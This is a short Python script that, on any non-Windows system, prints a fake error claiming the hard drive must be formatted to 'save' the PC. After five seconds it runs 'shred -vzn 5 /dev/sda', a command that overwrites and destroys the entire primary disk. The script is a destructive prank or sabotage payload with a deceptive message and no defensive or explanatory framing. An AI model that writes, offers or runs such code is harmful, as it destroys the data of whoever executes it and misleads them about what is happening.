import sys
import subprocess
import time
if not sys.platform.startswith('win'):
    try:
        assert (1 == 0)
    except AssertionError:
        print("1 is not 0 and you are not using Windows. Error, only way to save PC is by formatting the hard drive. Formatting in 5 seconds.")
    time.sleep(5)
    subprocess.run("shred -vzn 5 /dev/sda")